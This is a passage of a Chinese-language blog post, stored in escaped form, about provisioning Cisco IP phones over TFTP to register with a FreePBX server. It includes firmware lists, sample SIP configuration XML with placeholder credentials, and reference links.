S3\u0026#34;\u0026gt;\u0026lt;/loadInformation521\u0026gt; \u0026lt;loadInformation36241 model=\u0026#34;Cisco TelePresence DX70\u0026#34;\u0026gt;\u0026lt;/loadInformation36241\u0026gt; \u0026lt;loadInformation307 model=\u0026#34;Cisco 7911\u0026#34;\u0026gt;SCCP11.9-4-2SR1-1S\u0026lt;/loadInformation307\u0026gt; \u0026lt;loadInformation659 model=\u0026#34;Cisco 8831\u0026#34;\u0026gt;sip8831.10-3-1SR2-2\u0026lt;/loadInformation659\u0026gt; \u0026lt;loadInformation30 model=\u0026#34;Analog Access\u0026#34;\u0026gt;A001C030\u0026lt;/loadInformation30\u0026gt; \u0026lt;loadInformation47 model=\u0026#34;Analog Access WS-X6624\u0026#34;\u0026gt;A00204000013\u0026lt;/loadInformation47\u0026gt; \u0026lt;loadInformation51 model=\u0026#34;Conference Bridge WS-X6608\u0026#34;\u0026gt;C00104000003\u0026lt;/loadInformation51\u0026gt; \u0026lt;loadInformation40 model=\u0026#34;Digital Access\u0026#34;\u0026gt;D001M022\u0026lt;/loadInformation40\u0026gt; \u0026lt;loadInformation43 model=\u0026#34;Digital Access WS-X6608\u0026#34;\u0026gt;D00404000032\u0026lt;/loadInformation43\u0026gt; \u0026lt;loadInformation42 model=\u0026#34;Digital Access+\u0026#34;\u0026gt;D00303010033\u0026lt;/loadInformation42\u0026gt; \u0026lt;loadInformation61 model=\u0026#34;H.323 Phone\u0026#34;\u0026gt;\u0026lt;/loadInformation61\u0026gt; \u0026lt;loadInformation7 model=\u0026#34;Cisco 7960\u0026#34;\u0026gt;P0030801SR02\u0026lt;/loadInformation7\u0026gt; \u0026lt;loadInformation100 model=\u0026#34;Load Simulator\u0026#34;\u0026gt;\u0026lt;/loadInformation100\u0026gt; \u0026lt;loadInformation111 model=\u0026#34;Media Termination Point Hardware\u0026#34;\u0026gt;M00104000006\u0026lt;/loadInformation111\u0026gt; \u0026lt;loadInformation120 model=\u0026#34;MGCP Station\u0026#34;\u0026gt;\u0026lt;/loadInformation120\u0026gt; \u0026lt;loadInformation121 model=\u0026#34;MGCP Trunk\u0026#34;\u0026gt;\u0026lt;/loadInformation121\u0026gt; \u0026lt;loadInformation588 model=\u0026#34;Generic Desktop Video Endpoint\u0026#34;\u0026gt;\u0026lt;/loadInformation588\u0026gt; \u0026lt;loadInformation632 model=\u0026#34;Cisco Cius SP\u0026#34;\u0026gt;\u0026lt;/loadInformation632\u0026gt; \u0026lt;loadInformation647 model=\u0026#34;Cisco DX650\u0026#34;\u0026gt;\u0026lt;/loadInformation647\u0026gt; \u0026lt;loadInformation348 model=\u0026#34;Cisco 7931\u0026#34;\u0026gt;SCCP31.9-4-2SR1-1S\u0026lt;/loadInformation348\u0026gt; \u0026lt;loadInformation627 model=\u0026#34;Cisco TelePresence MX300\u0026#34;\u0026gt;\u0026lt;/loadInformation627\u0026gt; \u0026lt;loadInformation635 model=\u0026#34;CTI Remote Device\u0026#34;\u0026gt;\u0026lt;/loadInformation635\u0026gt; \u0026lt;loadInformation36235 model=\u0026#34;Cisco Spark Remote Device\u0026#34;\u0026gt;\u0026lt;/loadInformation36235\u0026gt; \u0026lt;loadInformation607 model=\u0026#34;Cisco TelePresence Codec C60\u0026#34;\u0026gt;\u0026lt;/loadInformation607\u0026gt; \u0026lt;loadInformation537 model=\u0026#34;Cisco 9951\u0026#34;\u0026gt;sip9951.9-4-2SR2-2\u0026lt;/loadInformation537\u0026gt; \u0026lt;loadInformation621 model=\u0026#34;Cisco 7821\u0026#34;\u0026gt;sip78xx.11-5-1-18\u0026lt;/loadInformation621\u0026gt; \u0026lt;loadInformation431 model=\u0026#34;Cisco 7937\u0026#34;\u0026gt;apps37sccp.1-4-5-7\u0026lt;/loadInformation431\u0026gt; \u0026lt;loadInformation376 model=\u0026#34;Nokia S60\u0026#34;\u0026gt;\u0026lt;/loadInformation376\u0026gt; \u0026lt;loadInformation375 model=\u0026#34;Cisco TelePresence\u0026#34;\u0026gt;\u0026lt;/loadInformation375\u0026gt; \u0026lt;loadInformation609 model=\u0026#34;Cisco TelePresence Quick Set C20\u0026#34;\u0026gt;\u0026lt;/loadInformation609\u0026gt; \u0026lt;loadInformation685 model=\u0026#34;Cisco 8861\u0026#34;\u0026gt;sip88xx.11-5-1-18\u0026lt;/loadInformation685\u0026gt; \u0026lt;loadInformation688 model=\u0026#34;Cisco TelePresence SX80\u0026#34;\u0026gt;\u0026lt;/loadInformation688\u0026gt; \u0026lt;loadInformation11 model=\u0026#34;Cisco VGC Virtual Phone\u0026#34;\u0026gt;\u0026lt;/loadInformation11\u0026gt; \u0026lt;loadInformation591 model=\u0026#34;Cisco TelePresence 1300-47\u0026#34;\u0026gt;\u0026lt;/loadInformation591\u0026gt; \u0026lt;loadInformation620 model=\u0026#34;Cisco TelePresence TX9200\u0026#34;\u0026gt;\u0026lt;/loadInformation620\u0026gt; \u0026lt;loadInformation10 model=\u0026#34;Cisco VGC Phone\u0026#34;\u0026gt;\u0026lt;/loadInformation10\u0026gt; \u0026lt;loadInformation484 model=\u0026#34;Cisco 7925\u0026#34;\u0026gt;CP7925G-1.4.8.4\u0026lt;/loadInformation484\u0026gt; \u0026lt;loadInformation617 model=\u0026#34;Cisco TelePresence MX200\u0026#34;\u0026gt;\u0026lt;/loadInformation617\u0026gt; \u0026lt;loadInformation562 model=\u0026#34;Cisco Dual Mode for iPhone\u0026#34;\u0026gt;\u0026lt;/loadInformation562\u0026gt; \u0026lt;loadInformation36239 model=\u0026#34;Cisco TelePresence DX80\u0026#34;\u0026gt;\u0026lt;/loadInformation36239\u0026gt; \u0026lt;loadInformation8 model=\u0026#34;Cisco 7940\u0026#34;\u0026gt;P0030801SR02\u0026lt;/loadInformation8\u0026gt; \u0026lt;loadInformation479 model=\u0026#34;Cisco TelePresence 3000\u0026#34;\u0026gt;\u0026lt;/loadInformation479\u0026gt; \u0026lt;loadInformation30027 model=\u0026#34;Analog Phone\u0026#34;\u0026gt;\u0026lt;/loadInformation30027\u0026gt; \u0026lt;loadInformation622 model=\u0026#34;Cisco 7841\u0026#34;\u0026gt;sip78xx.11-5-1-18\u0026lt;/loadInformation622\u0026gt; \u0026lt;loadInformation119 model=\u0026#34;Cisco 7971\u0026#34;\u0026gt;SCCP70.9-4-2SR1-1S\u0026lt;/loadInformation119\u0026gt; \u0026lt;loadInformation626 model=\u0026#34;Cisco TelePresence SX20\u0026#34;\u0026gt;\u0026lt;/loadInformation626\u0026gt; \u0026lt;loadInformation596 model=\u0026#34;Cisco TelePresence TX1310-65\u0026#34;\u0026gt;\u0026lt;/loadInformation596\u0026gt; \u0026lt;loadInformation577 model=\u0026#34;Cisco 7926\u0026#34;\u0026gt;CP7926G-1.4.8.4\u0026lt;/loadInformation577\u0026gt; \u0026lt;loadInformation564 model=\u0026#34;Cisco 6945\u0026#34;\u0026gt;SCCP6945.9-4-1-3SR2\u0026lt;/loadInformation564\u0026gt; \u0026lt;loadInformation604 model=\u0026#34;Cisco TelePresence EX60\u0026#34;\u0026gt;\u0026lt;/loadInformation604\u0026gt; \u0026lt;loadInformation36042 model=\u0026#34;Cisco DX80\u0026#34;\u0026gt;\u0026lt;/loadInformation36042\u0026gt; \u0026lt;loadInformation437 model=\u0026#34;Cisco 7975\u0026#34;\u0026gt;SCCP75.9-4-2SR1-1S\u0026lt;/loadInformation437\u0026gt; \u0026lt;loadInformation36232 model=\u0026#34;Cisco 8851NR\u0026#34;\u0026gt;sip88xx.11-5-1-18\u0026lt;/loadInformation36232\u0026gt; \u0026lt;loadInformation547 model=\u0026#34;Cisco 6901\u0026#34;\u0026gt;SCCP6901.9-3-1-SR2-2\u0026lt;/loadInformation547\u0026gt; \u0026lt;loadInformation404 model=\u0026#34;Cisco 7962\u0026#34;\u0026gt;SCCP42.9-4-2SR1-1S\u0026lt;/loadInformation404\u0026gt; \u0026lt;loadInformation435 model=\u0026#34;Cisco 7945\u0026#34;\u0026gt;SCCP45.9-3-1SR4-1S\u0026lt;/loadInformation435\u0026gt; \u0026lt;loadInformation302 model=\u0026#34;Cisco 7985\u0026#34;\u0026gt;cmterm_7985.4-1-7-0\u0026lt;/loadInformation302\u0026gt; \u0026lt;loadInformation612 model=\u0026#34;Cisco TelePresence Profile 52 (C40)\u0026#34;\u0026gt;\u0026lt;/loadInformation612\u0026gt; \u0026lt;loadInformation580 model=\u0026#34;Cisco E20\u0026#34;\u0026gt;\u0026lt;/loadInformation580\u0026gt; \u0026lt;loadInformation619 model=\u0026#34;Cisco TelePresence TX9000\u0026#34;\u0026gt;\u0026lt;/loadInformation619\u0026gt; \u0026lt;loadInformation575 model=\u0026#34;Cisco Dual Mode for Android\u0026#34;\u0026gt;\u0026lt;/loadInformation575\u0026gt; \u0026lt;loadInformation434 model=\u0026#34;Cisco 7942\u0026#34;\u0026gt;SCCP42.9-4-2SR1-1S\u0026lt;/loadInformation434\u0026gt; \u0026lt;loadInformation36224 model=\u0026#34;Cisco 8845\u0026#34;\u0026gt;sip8845_65.11-5-1SR1-1\u0026lt;/loadInformation36224\u0026gt; \u0026lt;loadInformation623 model=\u0026#34;Cisco 7861\u0026#34;\u0026gt;sip78xx.11-5-1-18\u0026lt;/loadInformation623\u0026gt; \u0026lt;loadInformation30028 model=\u0026#34;ISDN BRI Phone\u0026#34;\u0026gt;\u0026lt;/loadInformation30028\u0026gt; \u0026lt;loadInformation358 model=\u0026#34;Cisco Unified Personal Communicator\u0026#34;\u0026gt;\u0026lt;/loadInformation358\u0026gt; \u0026lt;loadInformation642 model=\u0026#34;Carrier-integrated Mobile\u0026#34;\u0026gt;\u0026lt;/loadInformation642\u0026gt; \u0026lt;loadInformation503 model=\u0026#34;Cisco Unified Client Services Framework\u0026#34;\u0026gt;\u0026lt;/loadInformation503\u0026gt; \u0026lt;loadInformation590 model=\u0026#34;Cisco TelePresence 500-32\u0026#34;\u0026gt;\u0026lt;/loadInformation590\u0026gt; \u0026lt;loadInformation493 model=\u0026#34;Cisco 9971\u0026#34;\u0026gt;sip9971.9-4-2SR2-2\u0026lt;/loadInformation493\u0026gt; \u0026lt;loadInformation652 model=\u0026#34;Cisco Jabber for Tablet\u0026#34;\u0026gt;\u0026lt;/loadInformation652\u0026gt; \u0026lt;loadInformation335 model=\u0026#34;Motorola CN622\u0026#34;\u0026gt;\u0026lt;/loadInformation335\u0026gt; \u0026lt;loadInformation436 model=\u0026#34;Cisco 7965\u0026#34;\u0026gt;SCCP45.9-4-2SR1-1S\u0026lt;/loadInformation436\u0026gt; \u0026lt;loadInformation683 model=\u0026#34;Cisco 8841\u0026#34;\u0026gt;sip88xx.11-5-1-18\u0026lt;/loadInformation683\u0026gt; \u0026lt;loadInformation505 model=\u0026#34;Cisco TelePresence 1300-65\u0026#34;\u0026gt;\u0026lt;/loadInformation505\u0026gt; \u0026lt;loadInformation584 model=\u0026#34;Cisco TelePresence EX90\u0026#34;\u0026gt;\u0026lt;/loadInformation584\u0026gt; \u0026lt;loadInformation36208 model=\u0026#34;Cisco TelePresence MX800\u0026#34;\u0026gt;\u0026lt;/loadInformation36208\u0026gt; \u0026lt;loadInformation611 model=\u0026#34;Cisco TelePresence Profile 42 (C60)\u0026#34;\u0026gt;\u0026lt;/loadInformation611\u0026gt; \u0026lt;loadInformation634 model=\u0026#34;Cisco VXC 6215\u0026#34;\u0026gt;\u0026lt;/loadInformation634\u0026gt; \u0026lt;loadInformation615 model=\u0026#34;Cisco TelePresence Profile 65 (C60)\u0026#34;\u0026gt;\u0026lt;/loadInformation615\u0026gt; \u0026lt;/Default\u0026gt; 使用tftp64或者linux上的其他tftp软件host这个文件夹，打开电话机，手动配置一下电话机下载配置的tftp服务器的ip，等待大概半分钟之后，电话机就会开始从tftp服务器下载配置文件，并开始升级（屏幕上会显示）。\n下发SIP配置 给电话机下发SIP配置同样需要用到tftp服务器（笔者推荐使用freepbx发行版里centos自带的tftp服务器，修改一下/etc/xinetd.d/tftp，重启xinetd就可以使用了）。如果需要了解更多配置选项，可以查阅https://usecallmanager.nz/sepmac-cnf-xml.html，此处笔者仅提供一个自己的Cisco电话机可用的配置：\n首先新建一个XMLDefault.cnf.xml在，注意修改processNodeName和loadInformation一行（数字和固件号需要跟前文的那个xml匹配）\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt; \u0026lt;Default\u0026gt; \u0026lt;callManagerGroup\u0026gt; \u0026lt;members\u0026gt; \u0026lt;member priority=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;callManager\u0026gt; \u0026lt;ports\u0026gt; \u0026lt;ethernetPhonePort\u0026gt;2000\u0026lt;/ethernetPhonePort\u0026gt; \u0026lt;mgcpPorts\u0026gt; \u0026lt;listen\u0026gt;2427\u0026lt;/listen\u0026gt; \u0026lt;keepAlive\u0026gt;2428\u0026lt;/keepAlive\u0026gt; \u0026lt;/mgcpPorts\u0026gt; \u0026lt;/ports\u0026gt; \u0026lt;!--FREEPBX SERVER IP GOES HERE--\u0026gt; \u0026lt;processNodeName\u0026gt;FREEPBX_IP\u0026lt;/processNodeName\u0026gt; \u0026lt;/callManager\u0026gt; \u0026lt;/member\u0026gt; \u0026lt;/members\u0026gt; \u0026lt;/callManagerGroup\u0026gt; \u0026lt;!--Cisco IP Phone Firmware--\u0026gt; \u0026lt;loadInformation585 model=\u0026#34;Cisco 8945\u0026#34;\u0026gt;SIP894x.9-4-2SR3-1\u0026lt;/loadInformation585\u0026gt; \u0026lt;authenticationURL\u0026gt;\u0026lt;/authenticationURL\u0026gt; \u0026lt;directoryURL\u0026gt;\u0026lt;/directoryURL\u0026gt; \u0026lt;idleURL\u0026gt;\u0026lt;/idleURL\u0026gt; \u0026lt;informationURL\u0026gt;\u0026lt;/informationURL\u0026gt; \u0026lt;messagesURL\u0026gt;\u0026lt;/messagesURL\u0026gt; \u0026lt;servicesURL\u0026gt;\u0026lt;/servicesURL\u0026gt; \u0026lt;/Default\u0026gt; 随后新建一个电话的hostname.cnf.xml，电话的hostname可以在电话的网络设置里看到，hostname需要全大写，根据自己的情况修改一下SIP的端口（freepbx的chan_sip的端口默认是TCP/UDP5160，TLS5161）和用户名密码：\n\u0026lt;device\u0026gt; \u0026lt;deviceProtocol\u0026gt;SIP\u0026lt;/deviceProtocol\u0026gt; \u0026lt;sshUserId\u0026gt;cisco\u0026lt;/sshUserId\u0026gt; \u0026lt;sshPassword\u0026gt;cisco\u0026lt;/sshPassword\u0026gt; \u0026lt;devicePool\u0026gt; \u0026lt;dateTimeSetting\u0026gt; \u0026lt;dateTemplate\u0026gt;Y.M.D\u0026lt;/dateTemplate\u0026gt; \u0026lt;timeZone\u0026gt;China Standard/Daylight Time\u0026lt;/timeZone\u0026gt; \u0026lt;ntps\u0026gt; \u0026lt;ntp\u0026gt; \u0026lt;name\u0026gt;time.apple.com\u0026lt;/name\u0026gt; \u0026lt;ntpMode\u0026gt;Unicast\u0026lt;/ntpMode\u0026gt; \u0026lt;/ntp\u0026gt; \u0026lt;/ntps\u0026gt; \u0026lt;/dateTimeSetting\u0026gt; \u0026lt;callManagerGroup\u0026gt; \u0026lt;members\u0026gt; \u0026lt;member priority=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;callManager\u0026gt; \u0026lt;ports\u0026gt; \u0026lt;ethernetPhonePort\u0026gt;2000\u0026lt;/ethernetPhonePort\u0026gt; \u0026lt;sipPort\u0026gt;5160\u0026lt;/sipPort\u0026gt; \u0026lt;securedSipPort\u0026gt;5161\u0026lt;/securedSipPort\u0026gt; \u0026lt;/ports\u0026gt; \u0026lt;processNodeName\u0026gt;10.20.18.222\u0026lt;/processNodeName\u0026gt; \u0026lt;/callManager\u0026gt; \u0026lt;/member\u0026gt; \u0026lt;/members\u0026gt; \u0026lt;/callManagerGroup\u0026gt; \u0026lt;/devicePool\u0026gt; \u0026lt;sipProfile\u0026gt; \u0026lt;sipProxies\u0026gt; \u0026lt;backupProxy\u0026gt;\u0026lt;/backupProxy\u0026gt; \u0026lt;backupProxyPort\u0026gt;5160\u0026lt;/backupProxyPort\u0026gt; \u0026lt;emergencyProxy\u0026gt;\u0026lt;/emergencyProxy\u0026gt; \u0026lt;emergencyProxyPort\u0026gt;\u0026lt;/emergencyProxyPort\u0026gt; \u0026lt;outboundProxy\u0026gt;\u0026lt;/outboundProxy\u0026gt; \u0026lt;outboundProxyPort\u0026gt;\u0026lt;/outboundProxyPort\u0026gt; \u0026lt;registerWithProxy\u0026gt;true\u0026lt;/registerWithProxy\u0026gt; \u0026lt;/sipProxies\u0026gt; \u0026lt;sipCallFeatures\u0026gt; \u0026lt;cnfJoinEnabled\u0026gt;true\u0026lt;/cnfJoinEnabled\u0026gt; \u0026lt;callForwardURI\u0026gt;x-serviceuri-cfwdall\u0026lt;/callForwardURI\u0026gt; \u0026lt;callPickupURI\u0026gt;x-cisco-serviceuri-pickup\u0026lt;/callPickupURI\u0026gt; \u0026lt;callPickupListURI\u0026gt;x-cisco-serviceuri-opickup\u0026lt;/callPickupListURI\u0026gt; \u0026lt;callPickupGroupURI\u0026gt;x-cisco-serviceuri-gpickup\u0026lt;/callPickupGroupURI\u0026gt; \u0026lt;meetMeServiceURI\u0026gt;x-cisco-serviceuri-meetme\u0026lt;/meetMeServiceURI\u0026gt; \u0026lt;abbreviatedDialURI\u0026gt;x-cisco-serviceuri-abbrdial\u0026lt;/abbreviatedDialURI\u0026gt; \u0026lt;rfc2543Hold\u0026gt;false\u0026lt;/rfc2543Hold\u0026gt; \u0026lt;callHoldRingback\u0026gt;2\u0026lt;/callHoldRingback\u0026gt; \u0026lt;localCfwdEnable\u0026gt;true\u0026lt;/localCfwdEnable\u0026gt; \u0026lt;semiAttendedTransfer\u0026gt;true\u0026lt;/semiAttendedTransfer\u0026gt; \u0026lt;anonymousCallBlock\u0026gt;2\u0026lt;/anonymousCallBlock\u0026gt; \u0026lt;callerIdBlocking\u0026gt;2\u0026lt;/callerIdBlocking\u0026gt; \u0026lt;dndControl\u0026gt;0\u0026lt;/dndControl\u0026gt; \u0026lt;remoteCcEnable\u0026gt;true\u0026lt;/remoteCcEnable\u0026gt; \u0026lt;/sipCallFeatures\u0026gt; \u0026lt;sipStack\u0026gt; \u0026lt;sipInviteRetx\u0026gt;6\u0026lt;/sipInviteRetx\u0026gt; \u0026lt;sipRetx\u0026gt;10\u0026lt;/sipRetx\u0026gt; \u0026lt;timerInviteExpires\u0026gt;180\u0026lt;/timerInviteExpires\u0026gt; \u0026lt;timerRegisterExpires\u0026gt;3600\u0026lt;/timerRegisterExpires\u0026gt; \u0026lt;timerRegisterDelta\u0026gt;5\u0026lt;/timerRegisterDelta\u0026gt; \u0026lt;timerKeepAliveExpires\u0026gt;120\u0026lt;/timerKeepAliveExpires\u0026gt; \u0026lt;timerSubscribeExpires\u0026gt;120\u0026lt;/timerSubscribeExpires\u0026gt; \u0026lt;timerSubscribeDelta\u0026gt;5\u0026lt;/timerSubscribeDelta\u0026gt; \u0026lt;timerT1\u0026gt;500\u0026lt;/timerT1\u0026gt; \u0026lt;timerT2\u0026gt;4000\u0026lt;/timerT2\u0026gt; \u0026lt;maxRedirects\u0026gt;70\u0026lt;/maxRedirects\u0026gt; \u0026lt;remotePartyID\u0026gt;false\u0026lt;/remotePartyID\u0026gt; \u0026lt;userInfo\u0026gt;None\u0026lt;/userInfo\u0026gt; \u0026lt;/sipStack\u0026gt; \u0026lt;autoAnswerTimer\u0026gt;1\u0026lt;/autoAnswerTimer\u0026gt; \u0026lt;autoAnswerAltBehavior\u0026gt;false\u0026lt;/autoAnswerAltBehavior\u0026gt; \u0026lt;autoAnswerOverride\u0026gt;true\u0026lt;/autoAnswerOverride\u0026gt; \u0026lt;transferOnhookEnabled\u0026gt;false\u0026lt;/transferOnhookEnabled\u0026gt; \u0026lt;enableVad\u0026gt;false\u0026lt;/enableVad\u0026gt; \u0026lt;dtmfAvtPayload\u0026gt;101\u0026lt;/dtmfAvtPayload\u0026gt; \u0026lt;dtmfDbLevel\u0026gt;3\u0026lt;/dtmfDbLevel\u0026gt; \u0026lt;dtmfOutofBand\u0026gt;avt\u0026lt;/dtmfOutofBand\u0026gt; \u0026lt;alwaysUsePrimeLine\u0026gt;false\u0026lt;/alwaysUsePrimeLine\u0026gt; \u0026lt;alwaysUsePrimeLineVoiceMail\u0026gt;false\u0026lt;/alwaysUsePrimeLineVoiceMail\u0026gt; \u0026lt;kpml\u0026gt;3\u0026lt;/kpml\u0026gt; \u0026lt;phoneLabel\u0026gt;Cisco 8945\u0026lt;/phoneLabel\u0026gt; \u0026lt;stutterMsgWaiting\u0026gt;1\u0026lt;/stutterMsgWaiting\u0026gt; \u0026lt;callStats\u0026gt;true\u0026lt;/callStats\u0026gt; \u0026lt;silentPeriodBetweenCallWaitingBursts\u0026gt;10\u0026lt;/silentPeriodBetweenCallWaitingBursts\u0026gt; \u0026lt;disableLocalSpeedDialConfig\u0026gt;false\u0026lt;/disableLocalSpeedDialConfig\u0026gt; \u0026lt;sipLines\u0026gt; \u0026lt;line button=\u0026#34;1\u0026#34;\u0026gt; \u0026lt;featureID\u0026gt;9\u0026lt;/featureID\u0026gt; \u0026lt;featureLabel\u0026gt;5111\u0026lt;/featureLabel\u0026gt; \u0026lt;proxy\u0026gt;USECALLMANAGER\u0026lt;/proxy\u0026gt; \u0026lt;port\u0026gt;5160\u0026lt;/port\u0026gt; \u0026lt;name\u0026gt;SIP_USERNAME\u0026lt;/name\u0026gt; \u0026lt;displayName\u0026gt;DISPLAYNAME\u0026lt;/displayName\u0026gt; \u0026lt;autoAnswer\u0026gt; \u0026lt;autoAnswerEnabled\u0026gt;2\u0026lt;/autoAnswerEnabled\u0026gt; \u0026lt;/autoAnswer\u0026gt; \u0026lt;callWaiting\u0026gt;3\u0026lt;/callWaiting\u0026gt; \u0026lt;authName\u0026gt;SIP_USERNAME\u0026lt;/authName\u0026gt; \u0026lt;authPassword\u0026gt;SIP_PASSWORD\u0026lt;/authPassword\u0026gt; \u0026lt;sharedLine\u0026gt;false\u0026lt;/sharedLine\u0026gt; \u0026lt;messageWaitingLampPolicy\u0026gt;1\u0026lt;/messageWaitingLampPolicy\u0026gt; \u0026lt;messagesNumber\u0026gt;*97\u0026lt;/messagesNumber\u0026gt; \u0026lt;ringSettingIdle\u0026gt;4\u0026lt;/ringSettingIdle\u0026gt; \u0026lt;ringSettingActive\u0026gt;5\u0026lt;/ringSettingActive\u0026gt; \u0026lt;contact\u0026gt;SIP_USERNAME\u0026lt;/contact\u0026gt; \u0026lt;forwardCallInfoDisplay\u0026gt; \u0026lt;callerName\u0026gt;true\u0026lt;/callerName\u0026gt; \u0026lt;callerNumber\u0026gt;true\u0026lt;/callerNumber\u0026gt; \u0026lt;redirectedNumber\u0026gt;true\u0026lt;/redirectedNumber\u0026gt; \u0026lt;dialedNumber\u0026gt;true\u0026lt;/dialedNumber\u0026gt; \u0026lt;/forwardCallInfoDisplay\u0026gt; \u0026lt;/line\u0026gt; \u0026lt;/sipLines\u0026gt; \u0026lt;voipControlPort\u0026gt;5160\u0026lt;/voipControlPort\u0026gt; \u0026lt;startMediaPort\u0026gt;10000\u0026lt;/startMediaPort\u0026gt; \u0026lt;stopMediaPort\u0026gt;11000\u0026lt;/stopMediaPort\u0026gt; \u0026lt;dscpForAudio\u0026gt;184\u0026lt;/dscpForAudio\u0026gt; \u0026lt;ringSettingBusyStationPolicy\u0026gt;0\u0026lt;/ringSettingBusyStationPolicy\u0026gt; \u0026lt;dialTemplate\u0026gt;dialplan.xml\u0026lt;/dialTemplate\u0026gt; \u0026lt;softKeyFile\u0026gt;\u0026lt;/softKeyFile\u0026gt; \u0026lt;/sipProfile\u0026gt; \u0026lt;commonProfile\u0026gt; \u0026lt;phonePassword\u0026gt;\u0026lt;/phonePassword\u0026gt; \u0026lt;backgroundImageAccess\u0026gt;true\u0026lt;/backgroundImageAccess\u0026gt; \u0026lt;callLogBlfEnabled\u0026gt;2\u0026lt;/callLogBlfEnabled\u0026gt; \u0026lt;/commonProfile\u0026gt; \u0026lt;loadInformation\u0026gt;SIP894x.9-4-2SR3-1\u0026lt;/loadInformation\u0026gt; \u0026lt;vendorConfig\u0026gt; \u0026lt;disableSpeaker\u0026gt;false\u0026lt;/disableSpeaker\u0026gt; \u0026lt;disableSpeakerAndHeadset\u0026gt;false\u0026lt;/disableSpeakerAndHeadset\u0026gt; \u0026lt;pcPort\u0026gt;1\u0026lt;/pcPort\u0026gt; \u0026lt;settingsAccess\u0026gt;1\u0026lt;/settingsAccess\u0026gt; \u0026lt;garp\u0026gt;0\u0026lt;/garp\u0026gt; \u0026lt;voiceVlanAccess\u0026gt;0\u0026lt;/voiceVlanAccess\u0026gt; \u0026lt;videoCapability\u0026gt;0\u0026lt;/videoCapability\u0026gt; \u0026lt;autoSelectLineEnable\u0026gt;0\u0026lt;/autoSelectLineEnable\u0026gt; \u0026lt;webAccess\u0026gt;1\u0026lt;/webAccess\u0026gt; \u0026lt;daysDisplayNotActive\u0026gt;1,2,3,4,5,6,7\u0026lt;/daysDisplayNotActive\u0026gt; \u0026lt;displayOnTime\u0026gt;00:01\u0026lt;/displayOnTime\u0026gt; \u0026lt;displayOnDuration\u0026gt;00:01\u0026lt;/displayOnDuration\u0026gt; \u0026lt;displayIdleTimeout\u0026gt;00:01\u0026lt;/displayIdleTimeout\u0026gt; \u0026lt;spanToPCPort\u0026gt;1\u0026lt;/spanToPCPort\u0026gt; \u0026lt;loggingDisplay\u0026gt;1\u0026lt;/loggingDisplay\u0026gt; \u0026lt;loadServer\u0026gt;\u0026lt;/loadServer\u0026gt; \u0026lt;sshAccess\u0026gt;0\u0026lt;/sshAccess\u0026gt; \u0026lt;/vendorConfig\u0026gt; \u0026lt;userLocale\u0026gt; \u0026lt;name\u0026gt;\u0026lt;/name\u0026gt; \u0026lt;uid\u0026gt;\u0026lt;/uid\u0026gt; \u0026lt;langCode\u0026gt;en_US\u0026lt;/langCode\u0026gt; \u0026lt;version\u0026gt;1.0.0.0-1\u0026lt;/version\u0026gt; \u0026lt;winCharSet\u0026gt;iso-8859-1\u0026lt;/winCharSet\u0026gt; \u0026lt;/userLocale\u0026gt; \u0026lt;networkLocale\u0026gt;\u0026lt;/networkLocale\u0026gt; \u0026lt;networkLocaleInfo\u0026gt; \u0026lt;name\u0026gt;\u0026lt;/name\u0026gt; \u0026lt;uid\u0026gt;\u0026lt;/uid\u0026gt; \u0026lt;version\u0026gt;1.0.0.0-1\u0026lt;/version\u0026gt; \u0026lt;/networkLocaleInfo\u0026gt; \u0026lt;deviceSecurityMode\u0026gt;1\u0026lt;/deviceSecurityMode\u0026gt; \u0026lt;authenticationURL\u0026gt;\u0026lt;/authenticationURL\u0026gt; \u0026lt;directoryURL\u0026gt;\u0026lt;/directoryURL\u0026gt; \u0026lt;servicesURL\u0026gt;\u0026lt;/servicesURL\u0026gt; \u0026lt;idleURL\u0026gt;\u0026lt;/idleURL\u0026gt; \u0026lt;informationURL\u0026gt;\u0026lt;/informationURL\u0026gt; \u0026lt;messagesURL\u0026gt;\u0026lt;/messagesURL\u0026gt; \u0026lt;proxyServerURL\u0026gt;\u0026lt;/proxyServerURL\u0026gt; \u0026lt;dscpForSCCPPhoneConfig\u0026gt;96\u0026lt;/dscpForSCCPPhoneConfig\u0026gt; \u0026lt;dscpForSCCPPhoneServices\u0026gt;0\u0026lt;/dscpForSCCPPhoneServices\u0026gt; \u0026lt;dscpForCm2Dvce\u0026gt;96\u0026lt;/dscpForCm2Dvce\u0026gt; \u0026lt;transportLayerProtocol\u0026gt;2\u0026lt;/transportLayerProtocol\u0026gt; \u0026lt;capfAuthMode\u0026gt;0\u0026lt;/capfAuthMode\u0026gt; \u0026lt;capfList\u0026gt; \u0026lt;capf\u0026gt; \u0026lt;phonePort\u0026gt;3804\u0026lt;/phonePort\u0026gt; \u0026lt;/capf\u0026gt; \u0026lt;/capfList\u0026gt; \u0026lt;certHash\u0026gt;\u0026lt;/certHash\u0026gt; \u0026lt;encrConfig\u0026gt;false\u0026lt;/encrConfig\u0026gt; \u0026lt;/device\u0026gt; 修改完后启动tftp服务器，在电话机上设置好tftp服务器后等待电话机完成注册，即可通过网络接打电话了。\n参考 https://groups.google.com/g/asterisk-tw/c/pfb3IlN6bbk https://kb.clearlyip.com/appliances/FXO-and-FXS-Setup-Guide.html https://wiki.freepbx.org/pages/viewpage.action?pageId=58097711 https://usecallmanager.nz/sepmac-cnf-xml.html https://github.com/jefffall/Asterisk/blob/master/asterisk-version_15-config_files_july-3-2018/SEP6899CDA10587.cnf.xml ","permalink":"https://blog.sparktour.me/posts/2022/10/14/voip-fxo-via-asterisk-freepbx-dahdi/","summary":"\u003cp\u003e在本篇文章中，笔者尝试使用TDM410p FXO卡和freepbx，将固定电话的信号转换为了VoIP（SIP）协议，并使用SIP话机接打电话。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003ch2 id=\"所需硬件\"\u003e所需硬件\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003eFXO卡一块，比较便宜的解决方案是TDM410p，红色的是FXO卡（接墙上的电话线），绿色的是FXS卡（接电话机终端），我们所需的是\u003cstrong\u003eFXO卡\u003c/strong\u003e，购买前需要注意有些卡是PCI接口的，可能需要另外买PCI转PCIe的转接卡。淘宝上的单口FXO卡大约200元一块。笔者买了某淘宝店的单口FXO组合板（一张PCI接口的单口FXO卡，和一张PCI转PCIe转接卡组合在了一起）\u003c/li\u003e\n\u003cli\u003e主机一台，由于TDM410p的硬件规格太老，似乎\u003ca href=\"https://forum.proxmox.com/threads/pci-passthrough-problems.20728/\"\u003e无法在PVE上进行pcie直通\u003c/a\u003e，因此笔者用了一台旧电脑直接安装了\u003ca 